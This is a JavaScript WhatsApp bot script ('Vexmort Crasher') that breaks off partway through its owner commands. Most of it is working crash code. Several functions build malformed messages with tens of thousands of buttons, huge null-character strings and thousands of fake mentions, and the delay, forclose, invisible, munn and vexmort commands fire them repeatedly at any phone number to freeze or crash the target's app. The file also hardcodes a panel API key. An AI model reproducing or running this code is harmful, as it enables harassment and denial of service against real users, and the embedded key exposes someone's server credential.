/*

Script By AlwaysMunn
Support Rizz
Support Fhkry

*/

require('./config')
const {
	pawConnect,
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
const fs = require('fs')
const axios = require('axios')
const fetch = require('node-fetch')
const chalk = require('chalk')
const speed = require('performance-now')
const moment = require('moment-timezone')
const os = require('os')
const util = require('util')
const { spawn: spawn, exec } = require("child_process")
//=================================================//

const toJid = (num) => {
    return num.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
}

module.exports = paw = handler = async (paw, m, chatUpdate, store) => {
	try {
	
		const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./trashbase/lib/myfunc.js');
		const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./trashbase/lib/converter');
		const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./trashbase/lib/uploader');
    //=================================================//
// Load Database
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const botNumber = paw.user.id.split(':')[0] + "@s.whatsapp.net";
const pushname = m.pushName || "No Name";
const sender = m.sender;
const itsMe = m.sender == botNumber;
const senderPn = await paw.toPn(m.sender)
const isOwner = [botNumber, ...global.owner, ...owner]
    .map(v => v.includes("@s.whatsapp.net") ? v : v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
    .includes(senderPn);
const isPremium = premium
    .map(v => v.includes("@s.whatsapp.net") ? v : v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
    .includes(senderPn) || isOwner;
    //=================================================//
		var body = (
			m.mtype === 'conversation' ? m.message.conversation :
			m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
			m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
			m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
			m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
			m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
			m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
			m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
			m.mtype === 'messageContextInfo' ?
			m.message.buttonsResponseMessage?.selectedButtonId ||
			m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
			m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
			m.text :
			''
			);
		if (body == undefined) { body = '' };
		var budy = (typeof m.text == "string" ? m.text : "");
    //=================================================//
		//command
		const prefixRegex = /[.!#÷×/]/;
		const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : null;
		const isCmd = prefix ? body.startsWith(prefix) : false;
		const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';		
		const args = budy.trim().split(/ +/).slice(1);
		const q = text = args.join(' ')
			
		if (!paw.public) {
			if (!m.fromMe && !isOwner) return;
		};

		// Group
		const isGroup = m.chat.endsWith('@g.us');
		const groupMetadata = isGroup ? await paw.groupMetadata(m.chat).catch(e => null) : null;
		const groupName = groupMetadata?.subject || '';
		const groupMembers = groupMetadata?.participants || [];
		const groupAdmins = groupMembers.length ? await getGroupAdmins(groupMembers) : [];
		const isBotAdmin = groupAdmins.includes(botNumber + '@s.whatsapp.net');
		const isBotAdmins = groupAdmins.includes(botNumber);
		const isAdmins = groupAdmins.includes(m.sender);
		const groupOwner = groupMetadata?.owner || '';	
		const isGroupOwner = groupOwner ? groupOwner === m.sender : groupAdmins.includes(m.sender);

		//msg
		const isMedia = (m.type === 'imageMessage' || m.type === 'videoMessage')
		const fatkuns = (m.quoted || m)
		const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
		const qmsg = (quoted.msg || quoted)
		const mime = qmsg.mimetype || "";
		const moon = fs.readFileSync('./trashbase/media/moon.jpeg')
		const wangy = fs.readFileSync('./trashbase/media/peler.jpeg')

		//time
		const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		let ucapanWaktu;
		if (time >= "19:00:00" && time < "23:59:00") {
			ucapanWaktu = "夜 🌌";
		} else if (time >= "15:00:00" && time < "19:00:00") {
			ucapanWaktu = "午後 🌇";
		} else if (time >= "11:00:00" && time < "15:00:00") {
			ucapanWaktu = "正午 🏞️";
		} else if (time >= "06:00:00" && time < "11:00:00") {
			ucapanWaktu = "朝 🌁";
		} else {
			ucapanWaktu = "夜明け 🌆";
		}
		const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
		const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z");
		const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z");
		const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
		let d = new Date();
		let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime();
		let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5];
		let week = d.toLocaleDateString("id", { weekday: "long" });
		let calendar = d.toLocaleDateString("id", {
			day: "numeric",
			month: "long",
			year: "numeric"
		});		

        //quoted
		const ctt = {
			key: {
				remoteJid: '0@s.whatsapp.net', 
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};

		const callg = {
			key: {
				remoteJid: 'status@broadcast', 
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }]
                }
			}
		};

        //reply
		const xreply = async (teks) => {
			await sleep(500)
			return paw.sendMessage(m.chat, {
				contextInfo: {
					mentionedJid: [
						m.sender
					],
					externalAdReply: {
						showAdAttribution: false,
						renderLargerThumbnail: false, 
						title: `𝗩𝗲𝘅𝗺𝗼𝗿𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 - 𝗔𝗹𝘄𝗮𝘆𝘀𝗠𝘂𝗻𝗻`,
						body: `By AlwaysMunn 👋`,
						previewType: "VIDEO",
						thumbnail: moon,
						sourceUrl: global.url,
						mediaUrl: global.url
					}
				},
				text: teks
			}, {
				quoted: ctt
			})
		}
		
		// Prepare Media
        async function prM(params) {
            return await prepareWAMessageMedia(params, {
                upload: paw.waUploadToServer
            })
        }
//=================================================//
		if (isCmd)  {
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(m.sender), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
//=================================================//
async function restartPanelServer() {
    const API_KEY = 'Bearer ptlc_wVs78674Q2zQAZ627zBePpclNyiOsrDrjFjUnZZw8gS';
    const SERVER_ID = 'ebcefc66';
    const PTERO_URL = 'https://panel.bot-nexus.xyz';

    try {
        await axios.post(`${PTERO_URL}/api/client/servers/${SERVER_ID}/power`, {
            signal: 'restart'
        }, {
            headers: {
                Authorization: API_KEY,
                'Content-Type': 'application/json',
                Accept: 'application/json'
            }
        });

        return 'Server berhasil direstart via Pterodactyl.';
    } catch (err) {
        return 'Gagal restart: ' + (err.response?.data?.errors?.[0]?.detail || err.message);
    }
}

//          - 𝗔𝗪𝗔𝗟 𝗙𝗨𝗡𝗖𝗧 𝗕𝗨𝗚 𝗩𝗲𝘅𝗺𝗼𝗿𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 -     \\
async function Rizzdelayinvis(paw, target) {
  await paw.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: 'Alwasy Riz Kil You',
            },
            footer: {
              text: 'By @Rizznotdevcuy',
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 50000 }, (_, i) => ({
                buttonId: 'Rizz New',
                buttonText: {
                  displayText: '\x10'.repeat(250000),
                },
                buttonId: 'Rizz Here',
                buttonText: {
                  displayText: '\u0000'.repeat(250000),
                },
                type: 1,
              })),
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterName: 'ᴠɴxᴀɴᴛɪᴀᴍᴘᴀs',
                newsletterJid: '120363370508049655@newsletter',
              },
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );
}    
     
async function Rizzblank(paw, target) {
try {
const agus = {
GroupStatusMessageV2: {
message: {
interactiveMessage: {
body: { text: "always Rizz is hare" },
nativeFlowMessage: {
buttons: [{ name: "\u0000" + "\10x".repeat(10000) }]
}
}
}
}
};
await paw.sendMessage(target, agus);
await paw.chatModify({
delete: true,
lastMessages: [{
key: { remoteJid: target, fromMe: true, id: "pesan-terakhir" },
messageTimestamp: Math.floor(Date.now() / 1000)
}]
}, target);
} catch {}
}        
    
 async function fcnolickrizz(paw, target) {
  try {
    const msg = {
      orderMessage: {
        orderId: "92828",
        thumbnail: null,
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: "Rizz kill you",
        orderTitle: "Rizz last",
        sellerJid: target,
        token: "8282882828==",
        totalAmount1000: "828828292727372728829",
        totalCurrencyCode: "IDR",
        messageVersion: 1,
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from({ length: 3000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true,
        },
      },
    };

    await paw.relayMessage(target, msg, {});
    
    console.log(`✅ Sukses Sent To: ${target}`);
    
  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}
        
async function Rizzfc(paw, target) {
    const Null = {
        requestPaymentMessage: {
            amount: {
                value: 1,
                offset: 0,
                currencyCodeIso4217: "IDR",
                requestFrom: target,
                expiryTimestamp: Date.now()
            },
            contextInfo: {
                externalAdReply: {
                    title: "RIZZKILLYOUUUU",
                    body: "X".repeat(1500),
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    showAdAttribution: true,
                    sourceUrl: null,
                    thumbnailUrl: null
                }
            }
        }
    };
    await paw.relayMessage(target, Null, { participant: { jid: target } });
}    
   
 async function RizzBlankClickHard(sock, target) {
  const qpayment = {
    key: {
      remoteJid: '0@s.whatsapp.net',
      fromMe: false,
      id: 'VnX-Kayzen',
      participant: '0@s.whatsapp.net'
    },
    message: {
      requestPaymentMessage: {
        currencyCodeIso4217: "USD",
        amount1000: 999999999,
        requestFrom: '0@s.whatsapp.net',
        noteMessage: {
          extendedTextMessage: {
            text: 'Inget, Rizz Anti Ampas, Izinnn....'
          }
        },
        expiryTimestamp: 999999999,
        amount: {
          value: 91929291929,
          offset: 1000,
          currencyCode: "IDR"
        }
      }
    }
  };

  const productMsg = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net'
    },
    message: {
      productMessage: {
        product: {
          productImage: {
            mimetype: "image/jpeg",
            jpegThumbnail: "\u0000".repeat(15000)
          },
          title: `VnX - Marketplace`,
          description: " ",
          currencyCode: "IDR",
          priceAmount1000: "999999999999999",
          retailerId: `Powered By Always Rizz`,
          productImageCount: 1
        },
        businessOwnerJid: `0@s.whatsapp.net`
      }
    }
  };

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "Rizz" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 50000 }, () => ({}))
          },
          contextInfo: {
            quotedMessage: { ...qpayment.message, ...productMsg.message }
          }
        }
      }
    }
  };

  const result = await paw.relayMessage(target, msg, { participant: { jid: target } });

  await paw.chatModify({
    delete: true,
    lastMessages: [{
      key: {
        remoteJid: target,
        fromMe: true,
        id: result.key.id
      },
      messageTimestamp: Date.now()
    }]
  }, target);

  console.log('✅ Success');
}     
   
 async function zeszstuck(paw, target) {
  try {
    const Zesz = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
             newsletterJid: "083149016304@newsletter",
             inviteCode: "𑜦𑜠".repeat(120000),
             inviteExpiration: 99999999999,
             newsletterName: "ោ៝" + "ꦾ".repeat(250000),
             body: {
                 text: "Riz" + "ી".repeat(250000)
                }
             }
          }
       }
    };

    await paw.relayMessage(target, Zesz, { participant: { jid: target } });
  } catch (e) {
    console.log("❌ Error:", e.message || e);
  }
}      
        
//          - 𝗔𝗞𝗛𝗜𝗥 𝗙𝗨𝗡𝗖𝗧 𝗕𝗨𝗚 𝗩𝗲𝘅𝗺𝗼𝗿𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 -          //

		switch (command) {
   
            case 'menu': {
  let menu = `Hi ${pushname}, I am the WhatsApp bot Vexmort who is ready to help you.\n
𖤧─═⪼ 情報 ⪻═─⬣
 ▢ d𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋: AlwaysMunn
 ▢ developer: Fhkry
 ▢ developer: Rizz
 ▢ nama script: Vexmort Crasher
 ▢ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇: 1.0
 ▢ run𝗍𝗂𝗆𝖾 botz: ( 01:27:59 )
 ▢ 𝗅𝖺𝗇𝗀𝗎𝖺𝗀𝖾: JavaScript 
 ▢ 𝗍𝗒𝗉𝖾: ( CommonJs )
`;

  const buttons = [
    {
      buttonId: `.bug`, 
      buttonText: { displayText: 'Bug Menu' }, 
      type: 1
    },
    {
      buttonId: `.chaneldev`, 
      buttonText: { displayText: 'Channel Developer' }, 
      type: 1
    },
        {
      buttonId: `.ownermenu`, 
      buttonText: { displayText: 'Owner Menu' }, 
      type: 1
    },
    {
      buttonId: `.buy`, 
      buttonText: { displayText: 'Buy Sc' }, 
      type: 1
    },
    {
      buttonId: `.ping`, 
      buttonText: { displayText: '클레오트라는' }, 
      type: 1
    }
  ];

  const buttonMessage = {
    image: { url: 'https://img2.pixhost.to/images/8720/740483242_fhkry.jpg' },
    caption: menu,
    footer: '© 𝗔𝗹𝘄𝗮𝘆𝘀𝗠𝘂𝗻𝗻',
    buttons: buttons,
    headerType: 4,
    mentions: await paw.ments('Aʟʟ Mᴇɴᴜ')
  };

  return await paw.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break;

        case 'bug': {
        let anj = `𖤧─═⪼ 情報 ⪻═─⬣
 ▢ d𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋: AlwaysMunn
 ▢ developer: Fhkry
 ▢ developer: Rizz
 ▢ nama script: Vexmort Crasher
 ▢ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇: 1.0
 ▢ run𝗍𝗂𝗆𝖾 botz: ( 01:27:59 )
 ▢ 𝗅𝖺𝗇𝗀𝗎𝖺𝗀𝖾: JavaScript 
 ▢ 𝗍𝗒𝗉𝖾: ( CommonJs )
 
Bug Menu
︎▢ delay-1 62xxxx
▢ forclose 62xxxx
▢ invisible 62xxxx

Special Bug
▢ munn > 62𝚡𝚡𝚡
╰───➤ *Delay bebas spam*
▢ vexmort 62𝚡𝚡𝚡
╰───➤ *Combo Funct*`;

        paw.sendMessage(m.chat, { 
            image: { url: 'https://img2.pixhost.to/images/8720/740483242_fhkry.jpg' },
            caption: anj,
            footer: "© AlwaysMunn",
            buttons: [
                { 
                    buttonId: ".tqto", 
                    buttonText: {
                        displayText: "Thanks To"
                    }, type: 1 
                }
            ],
            viewOnce: true,
            headerType: 4
        }, { quoted: m });
    }
    break;


//          - 𝗖𝗔𝗦𝗘 𝗕𝗨𝗚 -         //
case 'delay': {
    if (!isPremium) return xreply("No Access");
    if (!q) return m.reply(`*Example: ${prefix + command} 628xxx*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with country code *\n_Example: ${prefix + command} 628xxx_`);
    }

    let target = bijipler + "@s.whatsapp.net";
    let progressHeader = `#- 𝘉 𝘜 𝘎 - 𝘋 𝘌 𝘓 𝘈 𝘠 V1\n ▢ ᴛᴀʀɢᴇᴛ : ${target}`;

    const stages = [
        "... 10%",
        "... 30%",
        "... 50%",
        "... 70%",
        "... 90%",
        "... 100%\n✅ Success!"
    ];

    let progressMsg = await paw.sendMessage(m.chat, {
        text: `${progressHeader}\n ▢ Status : Starting...`
    }, { quoted: m });

    for (let stage of stages) {
        await sleep(100);
        await paw.sendMessage(m.chat, {
            text: `${progressHeader}\n ${stage}`,
            edit: progressMsg.key
        });
    }

    let success = 0;
    let fail = 0;

    for (let i = 0; i < 150; i++) {
    try {
        await zeszstuck(paw, target);
        await Rizzblank(paw, target);
        await zeszstuck(paw, target);
        await sleep(300)
        success++;
    } catch (e) {
        fail++;
    }
    }

    await sleep(100);

    await paw.sendMessage(m.chat, {
        text: `${progressHeader}
╰➤ Delay V1 berhasil dikirim ke ${target}!
 ▢ sᴜᴄᴄᴇs : ${success}
 ▢ ғᴀɪʟᴇᴅ : ${fail}
 ▢ ᴅᴇᴠʟᴏᴘᴇʀ : AlwaysMunn`,
        edit: progressMsg.key
    });
}
break;

case 'forclose': {
    if (!isPremium) return xreply("No Access");
    if (!q) return m.reply(`*Example: ${prefix + command} 628xxx*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with country code *\n_Example: ${prefix + command} 628xxx_`);
    }

    let target = bijipler + "@s.whatsapp.net";
    let progressHeader = `#- 𝘉 𝘜 𝘎 - F O R C L O S E\n ▢ ᴛᴀʀɢᴇᴛ : ${target}`;

    const stages = [
        "... 10%",
        "... 30%",
        "... 50%",
        "... 70%",
        "... 90%",
        "... 100%\n✅ Success!"
    ];

    let progressMsg = await paw.sendMessage(m.chat, {
        text: `${progressHeader}\n ▢ Status : Starting...`
    }, { quoted: m });

    for (let stage of stages) {
        await sleep(100);
        await paw.sendMessage(m.chat, {
            text: `${progressHeader}\n ${stage}`,
            edit: progressMsg.key
        });
    }

    let success = 0;
    let fail = 0;

    for (let i = 0; i < 90; i++) {
    try {
        await zeszstuck(paw, target);
        await Rizzblank(paw, target);
        await sleep(350)
        success++;
    } catch (e) {
        fail++;
    }
    }

    await sleep(100);

    await paw.sendMessage(m.chat, {
        text: `${progressHeader}
╰➤ FC Click berhasil dikirim ke ${target}!
 ▢ sᴜᴄᴄᴇs : ${success}
 ▢ ғᴀɪʟᴇᴅ : ${fail}
 ▢ ᴅᴇᴠʟᴏᴘᴇʀ : AlwaysMunn`,
        edit: progressMsg.key
    });
}
break;

case 'invisible': {
    if (!isPremium) return xreply("No Access");
    if (!q) return m.reply(`*Example: ${prefix + command} 628xxx*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with country code *\n_Example: ${prefix + command} 628xxx_`);
    }

    let target = bijipler + "@s.whatsapp.net";
    let progressHeader = `#- 𝘉 𝘜 𝘎 - 𝘋 𝘌 𝘓 𝘈 𝘠 𝘐 𝘕 𝘝 𝘐 𝘚\n ▢ ᴛᴀʀɢᴇᴛ : ${target}`;

    const stages = [
        "... 10%",
        "... 30%",
        "... 50%",
        "... 70%",
        "... 90%",
        "... 100%\n✅ Success!"
    ];

    let progressMsg = await paw.sendMessage(m.chat, {
        text: `${progressHeader}\n ▢ Status : Starting...`
    }, { quoted: m });

    for (let stage of stages) {
        await sleep(100);
        await paw.sendMessage(m.chat, {
            text: `${progressHeader}\n ${stage}`,
            edit: progressMsg.key
        });
    }

    let success = 0;
    let fail = 0;

    for (let i = 0; i < 150; i++) {
    try {
        await Rizzdelayinvis(paw, target);
        await sleep(500)
        success++;
    } catch (e) {
        fail++;
    }
    }

    await sleep(200);

    await paw.sendMessage(m.chat, {
        text: `${progressHeader}
╰➤ Delay V3 berhasil dikirim ke ${target}!
 ▢ sᴜᴄᴄᴇs : ${success}
 ▢ ғᴀɪʟᴇᴅ : ${fail}
 ▢ ᴅᴇᴠʟᴏᴘᴇʀ : AlwaysMunn`,
        edit: progressMsg.key
    });
}
break;

case 'munn': {
    if (!isPremium) return xreply("No Access");
    if (!q) return m.reply(`*Example: ${prefix + command} 628xxx*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with country code *\n_Example: ${prefix + command} 628xxx_`);
    }

    let target = bijipler + "@s.whatsapp.net";
    let progressHeader = `#- 𝘋 𝘌 𝘓 𝘈 𝘠 - 𝘉 𝘌 𝘉 𝘈 𝘚 - 𝘚 𝘗 𝘈 𝘔\n ▢ ᴛᴀʀɢᴇᴛ : ${target}`;

    const stages = [
        "... 10%",
        "... 30%",
        "... 50%",
        "... 70%",
        "... 90%",
        "... 100%\n✅ Success!"
    ];

    let progressMsg = await paw.sendMessage(m.chat, {
        text: `${progressHeader}\n ▢ Status : Starting...`
    }, { quoted: m });

    for (let stage of stages) {
        await sleep(100);
        await paw.sendMessage(m.chat, {
            text: `${progressHeader}\n ${stage}`,
            edit: progressMsg.key
        });
    }

    let success = 0;
    let fail = 0;

    for (let i = 0; i < 80; i++) {
    try {
        await Rizzdelayinvis(paw, target);
        await Rizzblank(paw, target)
        await zeszstuck(paw, target);
        await sleep(250)
        success++;
    } catch (e) {
        fail++;
    }
    }

    await sleep(100);

    await paw.sendMessage(m.chat, {
        text: `${progressHeader}
╰➤ Delay Bebas Spam berhasil dikirim ke ${target}!
 ▢ sᴜᴄᴄᴇs : ${success}
 ▢ ғᴀɪʟᴇᴅ : ${fail}
 ▢ ᴅᴇᴠʟᴏᴘᴇʀ : AlwaysMunn`,
        edit: progressMsg.key
    });
}
break;

case 'vexmort': {
    if (!isPremium) return xreply("No Access");
    if (!q) return m.reply(`*Example: ${prefix + command} 628xxx*`);

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with country code *\n_Example: ${prefix + command} 628xxx_`);
    }

    let target = bijipler + "@s.whatsapp.net";
    let progressHeader = `#-  𝘊 𝘖 𝘔 𝘉 𝘖 - 𝘈 𝘓 𝘓 - 𝘍 𝘜 𝘕 𝘊 𝘛\n ▢ ᴛᴀʀɢᴇᴛ : ${target}`;

    const stages = [
        "... 10%",
        "... 30%",
        "... 50%",
        "... 70%",
        "... 90%",
        "... 100%\n✅ Success!"
    ];

    let progressMsg = await paw.sendMessage(m.chat, {
        text: `${progressHeader}\n ▢ Status : Starting...`
    }, { quoted: m });

    for (let stage of stages) {
        await sleep(100);
        await paw.sendMessage(m.chat, {
            text: `${progressHeader}\n ${stage}`,
            edit: progressMsg.key
        });
    }

    let success = 0;
    let fail = 0;

    for (let i = 0; i < 150; i++) {
    try {
        await Rizzdelayinvis(paw, target);
        await Rizzblank(paw, target)
        await zeszstuck(paw, target);
        await sleep(250)
        success++;
    } catch (e) {
        fail++;
    }
    }

    await sleep(100);

    await paw.sendMessage(m.chat, {
        text: `${progressHeader}
╰➤ Combo all funct berhasil dikirim ke ${target}!
 ▢ sᴜᴄᴄᴇs : ${success}
 ▢ ғᴀɪʟᴇᴅ : ${fail}
 ▢ ᴅᴇᴠʟᴏᴘᴇʀ : AlwaysMunn`,
        edit: progressMsg.key
    });
}
break;

//          - 𝗘𝗡𝗗 𝗖𝗔𝗦𝗘 𝗕𝗨𝗚 -          //
			
			        case 'tqto': {
    let peler = `congratulations to those who have helped me to develop this script

— Allah 
— Ke Dua Ortu
— AlwaysMunn 
— Rizzz
— Fhkry
— All Nakama Vexmort Crasher

⚠︎ ᴡɪᴛʜᴏᴜᴛ ᴛʜᴇᴍ, ᴛʜɪs sᴄʀɪᴘᴛ ɪs ɴᴏᴛʜɪɴɢ`
    paw.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `🕊𝗩𝗲𝘅𝗺𝗼𝗿𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿🕊`,
                body: `please use this script wisely`,
                mediaType: 1,
                thumbnailUrl: 'https://img2.pixhost.to/images/8720/740483242_fhkry.jpg',
                thumbnail: ``,
                sourceUrl: `https://wa.me/6285876670135`
            }
        }
    }, { quoted: m });
};
break;

case 'chaneldev': {
    let peler = `All Channel Developer & Info Sc Vexmort Crasher
  
— Channel Official Vexmort Crasher
▢ https://whatsapp.com/channel/0029VbCbE5aJ3jv0X1vOkt1u

— Channel Developer —
▢ Channel AlwaysMunn
https://whatsapp.com/channel/0029VbCRUA7BVJl1zO1M4S1S
▢ Channel Fhkry
https://whatsapp.com/channel/0029Vb6PTBx4IBhI4YkAsQ0p
▢ Channel Rizz


 - Join Channel Developer & Official Script -`
    paw.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `🕊𝗩𝗲𝘅𝗺𝗼𝗿𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿🕊`,
                body: `please use this script wisely`,
                mediaType: 1,
                thumbnailUrl: 'https://img2.pixhost.to/images/8720/740483242_fhkry.jpg',
                thumbnail: ``,
                sourceUrl: `https://wa.me/6285876670135`
            }
        }
    }, { quoted: m });
};
break;

case 'buy': {
    let peler = `Script Vexmort Tidak Pernah Di Jual Beli Kan,Dan Di Bagikan Secara Free`
    paw.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `🕊𝗩𝗲𝘅𝗺𝗼𝗿𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿🕊`,
                body: `please use this script wisely`,
                mediaType: 1,
                thumbnailUrl: 'https://img2.pixhost.to/images/8720/740483242_fhkry.jpg',
                thumbnail: ``,
                sourceUrl: `https://wa.me/6285876670135`
            }
        }
    }, { quoted: m });
};
break;

case 'ownermenu': {
    let peler = `𖤧─═⪼ 情報 ⪻═─⬣
 ▢ d𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋: AlwaysMunn
 ▢ developer: Fhkry
 ▢ developer: Rizz
 ▢ nama script: Vexmort Crasher
 ▢ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇: 1.0
 ▢ run𝗍𝗂𝗆𝖾 botz: ( 01:27:59 )
 ▢ 𝗅𝖺𝗇𝗀𝗎𝖺𝗀𝖾: JavaScript 
 ▢ 𝗍𝗒𝗉𝖾: ( CommonJs )
 
┏─『 Owner Menu 』
│ ▢︎ addprem 62xxxx
│ ▢︎ delprem 62xxxx
│ ▢ addowner 62xxxx
│ ▢ delowner 62xxxx
│ ▢ self (Self Botz) 
│ ▢ public (Public Botz) 
│ ▢ listprem (Daftar Prem) 
│ ▢ listown (Daftar Own) 
┗─────────────━`
    paw.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `🕊𝗩𝗲𝘅𝗺𝗼𝗿𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿🕊`,
                body: `please use this script wisely`,
                mediaType: 1,
                thumbnailUrl: 'https://img2.pixhost.to/images/8720/740483242_fhkry.jpg',
                thumbnail: ``,
                sourceUrl: `https://wa.me/6285876670135`
            }
        }
    }, { quoted: m });
};
break;

// ===================== CASE: Owner Management =====================
case 'addowner':
case 'addown': {
    if (!isOwner) return xreply("Only owner");
